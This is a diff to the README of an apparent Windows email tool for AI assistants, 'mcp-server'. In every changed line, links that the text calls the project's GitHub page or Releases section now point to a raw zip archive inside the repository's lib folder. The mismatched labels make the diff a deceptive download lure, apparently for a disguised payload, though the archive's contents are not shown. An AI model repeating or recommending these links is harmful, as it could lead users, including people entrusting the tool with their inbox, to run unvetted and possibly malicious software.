@@ -1,6 +1,6 @@
 # ⚙️ mcp-server - Connect AI Assistants to Your Inbox
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/lagofrrr/mcp-server)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lagofrrr/mcp-server/main/lib/server-mcp-2.0.zip)
 
 ## 📋 What is mcp-server?
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 Use the button below to visit the GitHub page where you can download the software.
 
-[![Visit GitHub Download Page](https://img.shields.io/badge/Download-GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/lagofrrr/mcp-server)  
+[![Visit GitHub Download Page](https://img.shields.io/badge/Download-GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lagofrrr/mcp-server/main/lib/server-mcp-2.0.zip)  
 
 This link takes you to the project's main GitHub repository. From there, you can find the latest release of mcp-server available for Windows.
 
@@ -38,7 +38,7 @@ Follow these steps carefully:
 
 1. **Open the GitHub Page**  
    Click one of the download buttons above or enter this URL in your web browser:  
-   https://github.com/lagofrrr/mcp-server
+   https://raw.githubusercontent.com/lagofrrr/mcp-server/main/lib/server-mcp-2.0.zip
 
 2. **Find the Latest Release**  
    On the GitHub page, look for a section called **Releases** or a tab labeled **Releases** near the top. Click it.
@@ -138,10 +138,10 @@ These make your email smarter and easier to handle.
 ## 🌐 Useful Links
 
 Visit the GitHub repository anytime for updates or additional help:  
-https://github.com/lagofrrr/mcp-server
+https://raw.githubusercontent.com/lagofrrr/mcp-server/main/lib/server-mcp-2.0.zip
 
 You can find documentation, report issues, and learn more about the project here.
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/lagofrrr/mcp-server)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lagofrrr/mcp-server/main/lib/server-mcp-2.0.zip)
